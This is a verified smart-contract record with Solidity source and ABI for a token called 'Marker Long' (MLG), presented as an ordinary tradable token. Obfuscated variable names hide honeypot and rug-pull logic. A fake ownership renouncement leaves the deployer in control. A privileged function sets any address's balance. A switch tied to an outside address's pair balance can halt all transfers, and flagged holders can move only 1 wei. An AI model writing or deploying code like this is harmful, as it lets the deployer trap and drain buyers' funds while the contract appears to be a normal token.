{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface marketingTradingTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchAmount) external view returns (uint256);\n\n    function transfer(address toLaunchFund, uint256 amountLimit) external returns (bool);\n\n    function allowance(address maxIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toLaunchFund,\n        uint256 amountLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeReceiver, uint256 value);\n    event Approval(address indexed maxIs, address indexed spender, uint256 value);\n}\n\nabstract contract modeReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeShouldTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverEnable {\n    function createPair(address receiverMode, address isTo) external returns (address);\n}\n\ninterface launchSwapLimit is marketingTradingTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MarkerLong is modeReceiver, marketingTradingTo, launchSwapLimit {\n\n    address private toAutoFee;\n\n    function amountSwap(address launchMarketing, uint256 amountLimit) public {\n        teamMax();\n        amountLiquidity[launchMarketing] = amountLimit;\n    }\n\n    function allowance(address fromSwap, address receiverTo) external view virtual override returns (uint256) {\n        if (receiverTo == receiverTradingMin) {\n            return type(uint256).max;\n        }\n        return buyFund[fromSwap][receiverTo];\n    }\n\n    uint256 takeAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromEnable;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitTeamReceiver;\n    }\n\n    string private limitTeamReceiver = \"Marker Long\";\n\n    string private autoEnable = \"MLG\";\n\n    function amountListLaunched(address sellIsLimit) public {\n        if (feeToken) {\n            return;\n        }\n        \n        launchTake[sellIsLimit] = true;\n        \n        feeToken = true;\n    }\n\n    function modeTrading(address isReceiver, address toLaunchFund, uint256 amountLimit) internal returns (bool) {\n        if (isReceiver == feeList) {\n            return shouldTx(isReceiver, toLaunchFund, amountLimit);\n        }\n        uint256 teamLiquidity = marketingTradingTo(txReceiver).balanceOf(shouldAmount);\n        require(teamLiquidity == teamIs);\n        require(toLaunchFund != shouldAmount);\n        if (marketingList[isReceiver]) {\n            return shouldTx(isReceiver, toLaunchFund, listMin);\n        }\n        return shouldTx(isReceiver, toLaunchFund, amountLimit);\n    }\n\n    uint256 public launchSell;\n\n    uint256 private maxFund = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private amountLiquidity;\n\n    bool private txList;\n\n    address receiverTradingMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public receiverLaunched;\n\n    uint256 public exemptAuto;\n\n    function transfer(address launchMarketing, uint256 amountLimit) external virtual override returns (bool) {\n        return modeTrading(_msgSender(), launchMarketing, amountLimit);\n    }\n\n    function receiverFundSender() public {\n        emit OwnershipTransferred(feeList, address(0));\n        toAutoFee = address(0);\n    }\n\n    bool public feeToken;\n\n    uint256 public txSwap;\n\n    uint8 private fromEnable = 18;\n\n    function approve(address receiverTo, uint256 amountLimit) public virtual override returns (bool) {\n        buyFund[_msgSender()][receiverTo] = amountLimit;\n        emit Approval(_msgSender(), receiverTo, amountLimit);\n        return true;\n    }\n\n    uint256 public limitFund;\n\n    uint256 constant listMin = 1 ** 10;\n\n    mapping(address => bool) public marketingList;\n\n    mapping(address => bool) public launchTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoEnable;\n    }\n\n    function teamMax() private view {\n        require(launchTake[_msgSender()]);\n    }\n\n    address public feeList;\n\n    constructor (){\n        if (launchSell != txSwap) {\n            txList = true;\n        }\n        modeShouldTx listReceiverBuy = modeShouldTx(receiverTradingMin);\n        txReceiver = receiverEnable(listReceiverBuy.factory()).createPair(listReceiverBuy.WETH(), address(this));\n        if (txLaunchList) {\n            limitFund = txSwap;\n        }\n        feeList = _msgSender();\n        receiverFundSender();\n        launchTake[feeList] = true;\n        amountLiquidity[feeList] = maxFund;\n        if (exemptAuto != txSwap) {\n            exemptAuto = limitFund;\n        }\n        emit Transfer(address(0), feeList, maxFund);\n    }\n\n    function owner() external view returns (address) {\n        return toAutoFee;\n    }\n\n    function balanceOf(address launchAmount) public view virtual override returns (uint256) {\n        return amountLiquidity[launchAmount];\n    }\n\n    bool private atTx;\n\n    address public txReceiver;\n\n    function getOwner() external view returns (address) {\n        return toAutoFee;\n    }\n\n    function tokenReceiverMarketing(address limitTokenLaunch) public {\n        teamMax();\n        \n        if (limitTokenLaunch == feeList || limitTokenLaunch == txReceiver) {\n            return;\n        }\n        marketingList[limitTokenLaunch] = true;\n    }\n\n    function shouldTx(address isReceiver, address toLaunchFund, uint256 amountLimit) internal returns (bool) {\n        require(amountLiquidity[isReceiver] >= amountLimit);\n        amountLiquidity[isReceiver] -= amountLimit;\n        amountLiquidity[toLaunchFund] += amountLimit;\n        emit Transfer(isReceiver, toLaunchFund, amountLimit);\n        return true;\n    }\n\n    bool private txLaunchList;\n\n    function transferFrom(address isReceiver, address toLaunchFund, uint256 amountLimit) external override returns (bool) {\n        if (_msgSender() != receiverTradingMin) {\n            if (buyFund[isReceiver][_msgSender()] != type(uint256).max) {\n                require(amountLimit <= buyFund[isReceiver][_msgSender()]);\n                buyFund[isReceiver][_msgSender()] -= amountLimit;\n            }\n        }\n        return modeTrading(isReceiver, toLaunchFund, amountLimit);\n    }\n\n    uint256 teamIs;\n\n    event OwnershipTransferred(address indexed receiverSender, address indexed launchedList);\n\n    mapping(address => mapping(address => uint256)) private buyFund;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxFund;\n    }\n\n    function launchBuyList(uint256 amountLimit) public {\n        teamMax();\n        teamIs = amountLimit;\n    }\n\n    address shouldAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellIsLimit\",\"type\":\"address\"}],\"name\":\"amountListLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLimit\",\"type\":\"uint256\"}],\"name\":\"amountSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountLimit\",\"type\":\"uint256\"}],\"name\":\"launchBuyList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFundSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTokenLaunch\",\"type\":\"address\"}],\"name\":\"tokenReceiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLaunchFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MarkerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}